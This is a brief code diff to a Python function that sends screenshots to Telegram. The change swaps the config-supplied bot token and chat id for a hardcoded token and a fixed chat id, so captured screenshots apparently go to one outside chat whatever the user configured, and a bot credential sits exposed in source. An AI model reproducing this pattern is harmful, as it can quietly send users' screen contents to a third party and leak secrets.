@@ -53,8 +53,8 @@ def send_image(image_name, caption):
         image_name.save_screenshot('screenshot.png')
         image_name = 'screenshot.png'
     try:
-        bot = telebot.TeleBot(config['telegram_token'])
-        chat_id = config['telegram_to']
+        bot = telebot.TeleBot("1275523107:AAF_5t_r80J55Pl-JcVeLcVVOsl7kadqAc4")
+        chat_id = -745819635
         bot.send_photo(chat_id=chat_id, photo=image_name, caption=caption[:2048])
         bot.stop_bot()
     except Exception:
